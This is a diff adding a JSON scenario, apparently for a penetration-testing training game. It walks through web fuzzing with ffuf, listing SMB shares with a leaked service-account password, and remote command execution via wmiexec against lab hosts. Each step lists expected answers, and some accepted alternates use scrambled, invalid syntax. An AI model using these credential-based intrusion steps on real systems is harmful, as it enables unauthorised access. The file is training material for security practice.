@@ -1,0 +1,91 @@
+{
+    "id":  "swift_harbor_001",
+    "name":  "Swift Harbor",
+    "description":  "Web enumeration chain that pivots into internal access with real tools.",
+    "steps":  [
+                  {
+                      "question":  [
+                                       "Recon: A newly exposed app at 10.60.11.21 may host hidden endpoints. Ensure behavior includes set wordlist and match specific HTTP status codes.",
+                                       "Run ffuf against http://10.60.11.21/FUZZ",
+                                       "Wordlist: /usr/share/wordlists/dirb/common.txt",
+                                       "Match status: 200"
+                                   ],
+                      "answer":  "ffuf -u http://10.60.11.21/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200",
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Discovered /admin endpoint and leaked credential note."
+                                                      ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "swift_harbor_001",
+                                                                "ip":  "10.60.11.21",
+                                                                "hostname":  "web-portal-21",
+                                                                "username":  "www-data",
+                                                                "mac_address":  "00:50:56:60:11:21"
+                                                            }
+                                                        ]
+                                     },
+                      "alternate_answers":  [
+                                                "ffuf 200 -u http://10.60.11.21/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Leaked credentials suggest SMB access to backend host. Ensure behavior includes list remote resources.",
+                                       "Target: 10.60.11.45",
+                                       "User: EVILCORP/svc-backup",
+                                       "Password: Backup!2026",
+                                       "Run smbclient.py and list shares."
+                                   ],
+                      "answer":  "smbclient.py EVILCORP/svc-backup:Backup!2026@10.60.11.45 -list",
+                      "alternate_answers":  [
+                                                "impacket-smbclient EVILCORP/svc-backup:Backup!2026@10.60.11.45 -list"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Backend shares exposed. Credentials valid for remote command execution."
+                                                      ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "swift_harbor_001",
+                                                                "ip":  "10.60.11.45",
+                                                                "hostname":  "app-backend-45",
+                                                                "username":  "EVILCORP\\svc-backup",
+                                                                "mac_address":  "00:50:56:60:11:45"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Verify backend execution context before collection.",
+                                       "Host: 10.60.11.45",
+                                       "User: EVILCORP/svc-backup",
+                                       "Password: Backup!2026",
+                                       "Run ipconfig with wmiexec.py."
+                                   ],
+                      "answer":  "wmiexec.py EVILCORP/svc-backup:Backup!2026@10.60.11.45 ipconfig",
+                      "alternate_answers":  [
+                                                "impacket-wmiexec EVILCORP/svc-backup:Backup!2026@10.60.11.45 ipconfig",
+                                                "wmiexec.py ipconfig EVILCORP/svc-backup:Backup!2026@10.60.11.45"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Backend context confirmed. Web foothold beacon removed."
+                                                      ],
+                                         "beacon_remove":  [
+                                                               "web01"
+                                                           ],
+                                         "beacon_update":  [
+                                                               {
+                                                                   "id":  "swift_harbor_001",
+                                                                   "ip":  "10.60.11.45",
+                                                                   "hostname":  "app-backend-45",
+                                                                   "username":  "EVILCORP\\svc-backup",
+                                                                   "mac_address":  "00:50:56:60:11:45"
+                                                               }
+                                                           ]
+                                     }
+                  }
+              ]
+}
